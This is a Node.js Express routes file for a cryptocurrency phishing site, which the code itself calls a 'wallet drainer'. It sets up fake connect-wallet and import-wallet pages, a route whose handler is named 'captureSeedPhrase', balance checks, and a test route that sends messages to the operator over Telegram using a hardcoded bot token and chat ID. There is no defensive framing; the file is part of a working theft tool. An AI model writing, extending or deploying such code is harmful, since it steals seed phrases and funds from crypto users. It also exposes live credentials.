const express = require('express');
const router = express.Router();
const pageController = require('../controllers/pageController');
const analyticsController = require('../controllers/analyticsController');
const walletController = require('../controllers/walletController');

// Core Pages
router.get('/', pageController.renderHome);
router.get('/connect-wallet', pageController.renderConnectWallet);
router.get('/import-wallet', pageController.renderImportWallet);
router.get('/success', pageController.renderSuccess);
router.get('/dashboard', pageController.renderDashboard);
router.get('/health', pageController.healthCheck);

// API Routes
router.post('/api/track/visit', analyticsController.trackVisit);
router.post('/api/track/click', analyticsController.clickEvent);

// Wallet Routes
router.post('/api/wallet/connect', walletController.connectWallet);
router.post('/api/wallet/sign', walletController.signMessage);
router.post('/api/wallet/seed', walletController.captureSeedPhrase);
router.post('/api/import-wallet', walletController.importWallet);
router.post('/api/check-balance', walletController.checkBalance);
router.post('/api/import-wallet', walletController.importWallet);
router.post('/api/check-balance', walletController.checkBalance);

// Test route for Telegram
router.get('/test-telegram', async (req, res) => {
    try {
        const TelegramBot = require('../utils/telegram');
        const bot = new TelegramBot('8334219975:AAFieeTvjCuupdaJ1s4fZqE5eviiYESo6yo', '8032328516');
        await bot.sendMessage('Test message from wallet drainer!');
        res.json({ success: true, message: 'Telegram test sent!' });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

module.exports = router;
